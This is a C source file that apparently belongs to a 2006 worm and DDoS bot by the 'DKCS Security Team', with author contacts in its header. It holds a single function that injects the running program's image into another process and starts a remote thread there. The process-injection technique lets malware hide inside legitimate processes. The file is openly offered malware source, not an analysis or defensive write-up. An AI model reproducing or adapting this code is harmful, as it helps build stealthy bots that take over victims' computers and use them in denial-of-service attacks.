//-----------------------------------------------------------------
// this file is a part of: DKCS WORM.DDoS bot v 0.1
// c0d3d by: Dr.Pixel
// 2006 (C) DKCS Security Team
//
// contacts:	e-mail:	dkcs@void.ru
//				icq:	7600278
//				web:	http://dkcs.void.ru
//				forum:	http://dkcs.net.ru
//-----------------------------------------------------------------
BOOL InjectCode(DWORD dwPid, LPTHREAD_START_ROUTINE lpStartProc, LPVOID lpParam){

	HMODULE					hModule;
	LPVOID					hNewModule;
	DWORD					dwSize;
	HANDLE					hProcess;
	IMAGE_DOS_HEADER		ImageDosHeader;
	IMAGE_OPTIONAL_HEADER32	ImageOptionalHeader;

	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid);
	if(hProcess == NULL){
		// MessageBox(0, "Process opening ERROR.", "System ERROR", 0);
		return FALSE;
	}
	hModule = GetModuleHandle(NULL);
	CopyMemory(&ImageDosHeader, hModule, sizeof(ImageDosHeader));
	CopyMemory(&ImageOptionalHeader, ((BYTE *)hModule + sizeof(DWORD) + ImageDosHeader.e_lfanew + sizeof(IMAGE_FILE_HEADER)), sizeof(ImageOptionalHeader));
	dwSize = ImageOptionalHeader.SizeOfImage;
	VirtualProtectEx(hProcess, hModule, dwSize, PAGE_EXECUTE_READWRITE, NULL);

	#pragma check_stack(off)
	hNewModule = VirtualAllocEx(hProcess, hModule, dwSize, MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if(hNewModule == NULL){
		MessageBox(0, "Memory allocation ERROR.", "System ERROR", 0); // <- ! AHTUNG !
		return FALSE;
	}
	WriteProcessMemory(hProcess, hNewModule, hModule, dwSize, NULL);
	CreateRemoteThread(hProcess, NULL, 0x1000, lpStartProc, NULL, 0, NULL);
	#pragma check_stack(on)

return TRUE;
}
//-----------------------------------------------------------------